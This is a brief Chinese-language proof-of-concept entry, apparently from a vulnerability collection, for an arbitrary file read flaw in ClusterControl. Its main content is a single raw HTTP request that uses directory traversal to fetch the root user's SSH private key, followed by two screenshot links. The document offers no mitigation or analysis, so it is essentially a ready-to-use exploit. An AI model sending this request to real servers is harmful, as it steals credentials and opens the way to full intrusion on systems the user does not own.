# ClusterControl存在任意文件读取漏洞



## poc

```yaml
GET /../../../../../../../../..//root/.ssh/id_rsa HTTP/1.1
Host: 
Accept-Encoding: identity
User-Agent: python-urllib3/1.26.4
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011932688.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011932059.png)